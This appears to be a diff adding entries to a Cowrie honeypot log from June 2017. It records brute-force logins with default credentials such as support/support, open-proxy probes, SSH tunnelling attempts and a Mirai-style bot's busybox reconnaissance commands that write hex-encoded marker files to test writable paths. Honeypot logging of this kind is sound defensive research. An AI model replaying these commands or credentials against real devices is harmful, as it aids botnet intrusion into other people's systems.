@@ -3998,3 +3998,561 @@
 2017-06-12T10:10:59+0000 [CowrieTelnetTransport,44519,38.102.227.197] login attempt: 9
 2017-06-12T10:10:59+0000 [CowrieTelnetTransport,44519,38.102.227.197] login return, expect: [GET http://www.bing.com/ HTTP/1.1/Host: www.bing.com]
 2017-06-12T10:11:01+0000 [CowrieTelnetTransport,44519,38.102.227.197] login attempt [GET http://www.bing.com/ HTTP/1.1/Host: www.bing.com] succeeded
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Opening TTY Log: log/tty/20170612-101103-None-44519i.log
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Warning: state changed and new state returned
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] CMD: Proxy-Connection: Keep-Alive
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: Proxy-Connection: Keep-Alive
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] CMD: User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20060127 Netscape/8.1
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: User-Agent: Mozilla/5.0 Windows
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: U
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: Windows NT 5.1
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: en-US
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: rv:1.7.5 Gecko/20060127 Netscape/8.1
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] CMD: Referer: http://www.bing.com/
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: Referer: http://www.bing.com/
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] CMD: Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: Accept: text/html , application/xml
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Command not found: q=0.9 , application/xhtml+xml , image/png , image/webp , image/jpeg , image/gif , image/x-xbitmap , */*
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Unhandled Error
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/log.py", line 103, in callWithLogger
+	    return callWithContext({"system": lp}, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/log.py", line 86, in callWithContext
+	    return context.call({ILogContext: newCtx}, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/context.py", line 122, in callWithContext
+	    return self.currentContext().callWithContext(ctx, func, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/python/context.py", line 85, in callWithContext
+	    return func(*args,**kw)
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/posixbase.py", line 597, in _doReadOrWrite
+	    why = selectable.doRead()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/tcp.py", line 208, in doRead
+	    return self._dataReceived(data)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/tcp.py", line 214, in _dataReceived
+	    rval = self.protocol.dataReceived(data)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/telnet.py", line 636, in dataReceived
+	    self.applicationDataReceived(b''.join(appDataBuffer))
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/telnet.py", line 988, in applicationDataReceived
+	    self.protocol.dataReceived(data)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/protocols/basic.py", line 571, in dataReceived
+	    why = self.lineReceived(line)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/telnet.py", line 1100, in lineReceived
+	    newState = getattr(self, "telnet_" + oldState)(line)
+	  File "/home/cowrie/cowrie/cowrie/telnet/transport.py", line 142, in telnet_Command
+	    self.transport.protocol.dataReceived(command+'\r')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/telnet.py", line 1035, in dataReceived
+	    self.protocol.dataReceived(data)
+	  File "/home/cowrie/cowrie/cowrie/insults/insults.py", line 112, in dataReceived
+	    insults.ServerProtocol.dataReceived(self, data)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/insults/insults.py", line 537, in dataReceived
+	    self.terminalProtocol.keystrokeReceived(ch, None)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/recvline.py", line 225, in keystrokeReceived
+	    m()
+	  File "/home/cowrie/cowrie/cowrie/core/protocol.py", line 353, in handle_RETURN
+	    return recvline.RecvLine.handle_RETURN(self)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/recvline.py", line 292, in handle_RETURN
+	    self.lineReceived(line)
+	  File "/home/cowrie/cowrie/cowrie/core/protocol.py", line 187, in lineReceived
+	    self.cmdstack[-1].lineReceived(line)
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 246, in lineReceived
+	    self.runCommand()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 351, in runCommand
+	    runOrPrompt()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 257, in runOrPrompt
+	    self.runCommand()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 351, in runCommand
+	    runOrPrompt()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 257, in runOrPrompt
+	    self.runCommand()
+	  File "/home/cowrie/cowrie/cowrie/core/honeypot.py", line 307, in runCommand
+	    if not cmd['command']:
+	exceptions.KeyError: 'command'
+	
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Closing TTY Log: log/tty/20170612-101103-None-44519i.log after 0 seconds
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <type 'exceptions.KeyError'>: 'command'
+	]
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44519,38.102.227.197] Connection lost after 5 seconds
+2017-06-12T10:11:03+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:25366 (10.8.41.81:2222) [session: 604f1ffa]
+2017-06-12T10:11:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 38.102.227.197:59536 (10.8.41.81:2223) [session: TT44520]
+2017-06-12T10:11:03+0000 [CowrieTelnetTransport,44520,38.102.227.197] Connection lost after 0 seconds
+2017-06-12T10:11:03+0000 [HoneyPotSSHTransport,23306,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-12T10:11:03+0000 [HoneyPotSSHTransport,23306,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-12T10:11:03+0000 [HoneyPotSSHTransport,23306,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-12T10:11:03+0000 [HoneyPotSSHTransport,23306,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-12T10:11:04+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 38.102.227.197:59550 (10.8.41.81:2223) [session: TT44521]
+2017-06-12T10:11:04+0000 [CowrieTelnetTransport,44521,38.102.227.197] Connection lost after 0 seconds
+2017-06-12T10:11:04+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 38.102.227.197:59563 (10.8.41.81:2223) [session: TT44522]
+2017-06-12T10:11:04+0000 [CowrieTelnetTransport,44522,38.102.227.197] login attempt: 10
+2017-06-12T10:11:04+0000 [CowrieTelnetTransport,44522,38.102.227.197] login return, expect: [GET http://www.bing.com/ HTTP/1.1/Host: www.bing.com]
+2017-06-12T10:11:07+0000 [CowrieTelnetTransport,44522,38.102.227.197] login attempt [CONNECT 204.79.197.200:80 HTTP/1.0/] failed
+2017-06-12T10:11:07+0000 [CowrieTelnetTransport,44522,38.102.227.197] Warning: state changed and new state returned
+2017-06-12T10:11:11+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:41341 (10.8.41.81:2222) [session: 2022b1a8]
+2017-06-12T10:11:12+0000 [CowrieTelnetTransport,44522,38.102.227.197] Connection lost after 7 seconds
+2017-06-12T10:11:14+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] got channel 'direct-tcpip' request
+2017-06-12T10:11:14+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] direct-tcp connection request to 74.125.205.94:443 from localhost:5556
+2017-06-12T10:11:15+0000 [SSHChannel None (5) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] direct-tcp forward to 74.125.205.94:443 with data '\x16\x03\x01\x01{\x01\x00\x01w\x03\x03Y>h\x8f&\xd2\x7f`\xda\xd3e\x9e\xaf,M\xb8x\x10b\xdb_\xe5C\xaa\x998L]a\xde\xa0\x83\x00\x00\xca\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\xc0"\xc0!\x00\xa3\x00\x9f\x00k\x00j\x009\x008\x00\x88\x00\x87\xc0\x19\xc0 \x00\xa7\x00m\x00:\x00\x89\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x17\xc0\x1a\x00\x1b\xc0\r\xc0\x03\x00\n\xc0/\xc0+\xc0\'\xc0#\xc0\x13\xc0\t\xc0\x1f\xc0\x1e\x00\xa2\x00\x9e\x00g\x00@\x003\x002\x00\x9a\x00\x99\x00E\x00D\xc0\x18\xc0\x1d\x00\xa6\x00l\x004\x00\x9b\x00F\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x16\x00\x18\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x1a\x00\t\x00\x14\x00\x11\x00\x19\x00\x08\x00\x06\x00\x17\x00\x03\x00\xff\x01\x00\x00\x84\x00\x00\x00\x15\x00\x13\x00\x00\x10www.google.co.uk\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x004\x002\x00\x0e\x00\r\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\t\x00\n\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\r\x00"\x00 \x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x01\x01\x00\x0f\x00\x01\x01'
+2017-06-12T10:11:15+0000 [SSHChannel None (5) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] failed to connect: Connection refused
+2017-06-12T10:11:15+0000 [SSHChannel None (5) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] sending close 5
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23306,113.195.145.52] NEW KEYS
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23306,113.195.145.52] starting service 'ssh-userauth'
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23306,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23306,113.195.145.52] connection lost
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23306,113.195.145.52] Connection lost after 13 seconds
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23307,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23307,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23307,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23307,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23307,113.195.145.52] connection lost
+2017-06-12T10:11:17+0000 [HoneyPotSSHTransport,23307,113.195.145.52] Connection lost after 6 seconds
+2017-06-12T10:11:24+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 36.37.173.249:52451 (10.8.41.81:2223) [session: TT44523]
+2017-06-12T10:11:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,23099,91.230.47.75] got channel 'direct-tcpip' request
+2017-06-12T10:11:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,23099,91.230.47.75] direct-tcp connection request to 23.38.211.155:443 from localhost:5556
+2017-06-12T10:11:25+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23099,91.230.47.75] direct-tcp forward to 23.38.211.155:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\xb4WN~|\x81\x01\t\xed\xf4r\x18$xB3\n\xb6\xfe\xd3Y\xcc\xa2\xbe\x12\x82\xa8A\xda\x7f#\x0e'
+2017-06-12T10:11:25+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23099,91.230.47.75] failed to connect: Connection refused
+2017-06-12T10:11:25+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23099,91.230.47.75] sending close 23
+2017-06-12T10:11:28+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:32718 (10.8.41.81:2222) [session: 2a46d030]
+2017-06-12T10:11:31+0000 [HoneyPotSSHTransport,23308,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-12T10:11:31+0000 [HoneyPotSSHTransport,23308,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-12T10:11:31+0000 [HoneyPotSSHTransport,23308,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-12T10:11:31+0000 [HoneyPotSSHTransport,23308,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-12T10:11:32+0000 [HoneyPotSSHTransport,23308,113.195.145.52] NEW KEYS
+2017-06-12T10:11:33+0000 [HoneyPotSSHTransport,23308,113.195.145.52] starting service 'ssh-userauth'
+2017-06-12T10:11:34+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 163.172.104.150:35647 (10.8.41.81:2223) [session: TT44524]
+2017-06-12T10:11:34+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 163.172.104.150:50402 (10.8.41.81:2223) [session: TT44525]
+2017-06-12T10:11:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,23308,113.195.145.52] 'root' trying auth 'none'
+2017-06-12T10:11:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,23308,113.195.145.52] 'root' authenticated with 'none'
+2017-06-12T10:11:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,23308,113.195.145.52] starting service 'ssh-connection'
+2017-06-12T10:11:36+0000 [HoneyPotSSHTransport,23308,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-12T10:11:36+0000 [HoneyPotSSHTransport,23308,113.195.145.52] avatar root logging out
+2017-06-12T10:11:36+0000 [HoneyPotSSHTransport,23308,113.195.145.52] connection lost
+2017-06-12T10:11:36+0000 [HoneyPotSSHTransport,23308,113.195.145.52] Connection lost after 8 seconds
+2017-06-12T10:11:38+0000 [CowrieTelnetTransport,44524,163.172.104.150] first time for 163.172.104.150, need: 1
+2017-06-12T10:11:38+0000 [CowrieTelnetTransport,44524,163.172.104.150] login attempt: 1
+2017-06-12T10:11:41+0000 [CowrieTelnetTransport,44524,163.172.104.150] login attempt [support/support] succeeded
+2017-06-12T10:11:42+0000 [CowrieTelnetTransport,44524,163.172.104.150] Opening TTY Log: log/tty/20170612-101142-None-44524i.log
+2017-06-12T10:11:42+0000 [CowrieTelnetTransport,44524,163.172.104.150] Warning: state changed and new state returned
+2017-06-12T10:11:44+0000 [CowrieTelnetTransport,44525,163.172.104.150] login attempt: 2
+2017-06-12T10:11:44+0000 [CowrieTelnetTransport,44525,163.172.104.150] login return, expect: [support/support]
+2017-06-12T10:11:46+0000 [CowrieTelnetTransport,44525,163.172.104.150] login attempt [support/support] succeeded
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44525,163.172.104.150] Opening TTY Log: log/tty/20170612-101148-None-44525i.log
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44525,163.172.104.150] Warning: state changed and new state returned
+2017-06-12T10:11:48+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 163.172.104.150:41601 (10.8.41.81:2223) [session: TT44526]
+2017-06-12T10:11:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] got channel 'direct-tcpip' request
+2017-06-12T10:11:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] direct-tcp connection request to 74.125.205.94:443 from localhost:5556
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: enable
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: enable 
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: shell
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command not found: shell
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: sh
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: sh 
+2017-06-12T10:11:48+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 163.172.104.150:52564 (10.8.41.81:2223) [session: TT44527]
+2017-06-12T10:11:48+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 163.172.104.150:55211 (10.8.41.81:2223) [session: TT44528]
+2017-06-12T10:11:48+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 69.164.218.141:55426 (10.8.41.81:2223) [session: TT44529]
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44523,36.37.173.249] Connection lost after 23 seconds
+2017-06-12T10:11:48+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:25809 (10.8.41.81:2222) [session: 5258c17e]
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: enable
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: enable 
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44525,163.172.104.150] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44529,69.164.218.141] login attempt: 8
+2017-06-12T10:11:48+0000 [CowrieTelnetTransport,44529,69.164.218.141] login return, expect: [GET http://azenv.net/D9TNQpEAvCjEDOUZkFXq/ HTTP/1.1/Host: azenv.net]
+2017-06-12T10:11:50+0000 [CowrieTelnetTransport,44529,69.164.218.141] login attempt [GET http://azenv.net/szgj8N4azt4AqogJCeXX/ HTTP/1.1/Host: azenv.net] failed
+2017-06-12T10:11:50+0000 [CowrieTelnetTransport,44529,69.164.218.141] Warning: state changed and new state returned
+2017-06-12T10:11:51+0000 [CowrieTelnetTransport,44529,69.164.218.141] login attempt: 9
+2017-06-12T10:11:51+0000 [CowrieTelnetTransport,44529,69.164.218.141] login return, expect: [GET http://azenv.net/D9TNQpEAvCjEDOUZkFXq/ HTTP/1.1/Host: azenv.net]
+2017-06-12T10:11:53+0000 [CowrieTelnetTransport,44529,69.164.218.141] login attempt [User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0/Cache-Control: no-cache] failed
+2017-06-12T10:11:53+0000 [CowrieTelnetTransport,44529,69.164.218.141] Warning: state changed and new state returned
+2017-06-12T10:11:53+0000 [CowrieTelnetTransport,44529,69.164.218.141] login attempt: 10
+2017-06-12T10:11:53+0000 [CowrieTelnetTransport,44529,69.164.218.141] login return, expect: [GET http://azenv.net/D9TNQpEAvCjEDOUZkFXq/ HTTP/1.1/Host: azenv.net]
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44529,69.164.218.141] login attempt [Pragma: no-cache/Connection: close] failed
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44529,69.164.218.141] Warning: state changed and new state returned
+2017-06-12T10:11:55+0000 [HoneyPotSSHTransport,23309,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-12T10:11:55+0000 [HoneyPotSSHTransport,23309,113.195.145.52] connection lost
+2017-06-12T10:11:55+0000 [HoneyPotSSHTransport,23309,113.195.145.52] Connection lost after 7 seconds
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: shell
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command not found: shell
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: sh
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: sh 
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44529,69.164.218.141] Connection lost after 7 seconds
+2017-06-12T10:11:55+0000 [SSHChannel None (6) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] direct-tcp forward to 74.125.205.94:443 with data '\x16\x03\x01\x01{\x01\x00\x01w\x03\x03Y>h\xb0\xda\x9b\x973&T\x13\xdc\xbc\xf7\xbb6K\x0b\xa4|p\xc8\xb4~\x0fws7\xf0\xbbv\r\x00\x00\xca\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\xc0"\xc0!\x00\xa3\x00\x9f\x00k\x00j\x009\x008\x00\x88\x00\x87\xc0\x19\xc0 \x00\xa7\x00m\x00:\x00\x89\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x17\xc0\x1a\x00\x1b\xc0\r\xc0\x03\x00\n\xc0/\xc0+\xc0\'\xc0#\xc0\x13\xc0\t\xc0\x1f\xc0\x1e\x00\xa2\x00\x9e\x00g\x00@\x003\x002\x00\x9a\x00\x99\x00E\x00D\xc0\x18\xc0\x1d\x00\xa6\x00l\x004\x00\x9b\x00F\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x16\x00\x18\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x1a\x00\t\x00\x14\x00\x11\x00\x19\x00\x08\x00\x06\x00\x17\x00\x03\x00\xff\x01\x00\x00\x84\x00\x00\x00\x15\x00\x13\x00\x00\x10www.google.co.uk\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x004\x002\x00\x0e\x00\r\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\t\x00\n\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11\x00\r\x00"\x00 \x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x01\x01\x00\x0f\x00\x01\x01'
+2017-06-12T10:11:55+0000 [SSHChannel None (6) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] failed to connect: Connection refused
+2017-06-12T10:11:55+0000 [SSHChannel None (6) on SSHService 'ssh-connection' on HoneyPotSSHTransport,23243,91.230.47.82] sending close 6
+2017-06-12T10:11:55+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 163.172.104.150:37751 (10.8.41.81:2223) [session: TT44530]
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox ps; /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ps
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: ps
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] CMD: /bin/busybox ps; /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ps
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: ps
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44525,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /proc/mounts
+2017-06-12T10:11:55+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /proc/mounts
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox ECCHI
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: echo -e '\x6b\x61\x6d\x69/sys'
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox cat /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: cat /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: /bin/busybox rm /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] Command found: rm /sys/.nippon
+2017-06-12T10:11:56+0000 [CowrieTelnetTransport,44524,163.172.104.150] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
